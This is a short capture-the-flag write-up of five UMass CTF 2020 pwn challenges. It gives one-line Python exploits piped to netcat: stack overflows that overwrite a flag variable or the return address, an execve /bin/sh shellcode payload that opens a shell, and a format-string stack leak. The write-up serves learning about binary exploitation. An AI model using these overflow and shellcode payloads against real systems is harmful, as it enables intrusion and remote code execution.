# Introduction

This page details my pwn writeups for The University of Massachusetts Amherst CTF.
This CTF was originally just an internal CTF but I knew one of the moderators Sam.
Overall it was a great CTF and I really enjoyed it; they definitely had some unique challenges.

All my scripts and the provided files from the CTF can be found [here](https://github.com/nadrojisk/ctf-writeups/tree/master/2020-UMassCTF/rev).

# Baby Overflow I

## Prompt

This is my first program. Be nice :)

`nc 34.75.105.136 1024`

## TLDR;

Looking at the binary in GDB we see that the buffer is 16 characters and right above it is the variable for `should_get_flag`.
Therefore, we should write in 16 junk characters and then write in 0x1.

`python -c "import struct; out = 'A'*0x10; out += struct.pack('I', 0x1); print(out)" | nc 34.75.105.136 1024`

## Flag

`UMASS{N3v3r_g0nn4_m3s$_th1s_up}`

# Baby Overflow II

## Prompt

When my friend Ptasie Mleczko typed in his name, it gave him the flag. It was weird, but I think I fixed it.

nc 34.75.105.136 1025

## TLDR;

The binary is pretty much the same, however, this time it expects a specific value instead of a boolean True value.

`python -c "import struct;out = 'A'*0x10;out += struct.pack('I', 0xB16B00B5);print(out)" | nc 34.75.105.136 1025`

## Flag

`UMASS{Dyslexic_D0g_1nth3$ky}`

# Baby Overflow III

## Prompt

Okay, now it's really secure.

nc 34.75.105.136 1027

## TLDR;

For this challenge one has to gain control of the RIP to change execution flow.
This can be done by overloading the buffer, the saved RBP value on the stack and then by inserting the address one would like to execute at.

`(python -c "import struct;out = 'A'*0x10;out += 'bbbbbbbb';out += struct.pack('Q', 0x401132); out += struct.pack('Q', 0x401060); print(out)"; echo) | nc 34.75.105.136 1027`

## Flag

`UMASS{first_step_to_rop}`

# Baby Overflow IV

## Prompt

I don't even know why I had that function in the first place...

nc 34.75.105.136 1028

## TLDR;

`(python -c "import struct;out = 'A'*0x10;out += 'bbbbbbbb';out += struct.pack('Q', 0x0000000000404060); print('\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05');print(out)"; cat -) | nc 34.75.105.136 1028`

Once in the shell type
`cat flag`

## Flag

`UMASS{now_you_can_really_call_yourself_a_hacker}`

# format_what

## Prompt

We just learned format strings in 230, can you check if I'm doing it right?

nc 34.75.105.136 1030

## TLDR;


`python -c "print('%lu '*20)" | nc 34.75.105.136 1030 | (read -r i; read -r s; for i
 in $s; do python3 -c "import struct; print(struct.pack('Q', $i))"; done)`

## Flag

`UMASS{n0_f0rm4t_n33d3d!?}`
